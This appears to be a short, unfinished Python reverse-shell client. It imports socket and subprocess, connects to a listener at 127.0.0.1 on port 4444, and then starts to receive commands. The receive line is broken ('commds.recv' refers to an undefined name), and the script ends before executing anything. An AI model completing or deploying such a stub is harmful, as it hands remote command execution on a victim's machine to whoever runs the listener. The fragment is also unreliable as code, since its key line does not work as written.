import socket
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))

commds.recv(1024).decode()